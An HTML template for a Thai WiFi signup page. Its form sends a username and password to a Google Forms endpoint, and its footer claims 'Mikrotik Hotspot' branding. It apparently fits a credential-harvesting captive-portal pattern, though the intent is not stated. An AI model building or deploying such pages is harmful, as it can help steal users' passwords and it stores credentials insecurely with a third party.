<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>สมัครสมาชิก WiFi</title>
<style>
    body {
        margin: 0;
        font-family: Poppins, Arial, sans-serif;
        background: linear-gradient(135deg, #7b2ff7, #9d4edd, #c77dff);
        height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        color: #fff;
    }

    .box {
        background: rgba(255, 255, 255, 0.15);
        padding: 32px;
        width: 360px;
        border-radius: 18px;
        backdrop-filter: blur(12px);
        text-align: center;
        box-shadow: 0 0 25px rgba(0,0,0,0.25);
    }

    h1 {
        font-size: 27px;
        margin-bottom: 5px;
        font-weight: 600;
    }

    p {
        font-size: 14px;
        opacity: 0.9;
    }

    input {
        width: 90%;
        padding: 12px;
        margin: 10px 0;
        border-radius: 10px;
        border: none;
        outline: none;
        font-size: 15px;
    }

    button {
        width: 95%;
        padding: 12px;
        margin-top: 15px;
        border: none;
        border-radius: 10px;
        font-size: 16px;
        font-weight: bold;
        cursor: pointer;
        background: #ffffff;
        color: #5a189a;
        transition: 0.25s;
    }

    button:hover {
        background: #e5e5e5;
    }

    .footer {
        margin-top: 15px;
        font-size: 12px;
        opacity: 0.7;
    }
</style>
</head>

<body>

<div class="box">
    <h1>สมัครสมาชิก WiFi</h1>
    <p>กรอกข้อมูลเพื่อใช้งานอินเทอร์เน็ต</p>

    <form action="https://docs.google.com/forms/d/e/YOUR_FORM_ID/formResponse" method="POST" target="_blank">
        <!-- เปลี่ยน YOUR_FORM_ID เป็น ID ของ Google Form ของคุณ -->

        <input type="text" name="entry.1234567890" placeholder="Username" required>
        <input type="password" name="entry.2345678901" placeholder="Password" required>

        <button type="submit">สมัครสมาชิก</button>
    </form>

    <div class="footer">
        Powered by Mikrotik Hotspot
    </div>
</div>

</body>
</html>
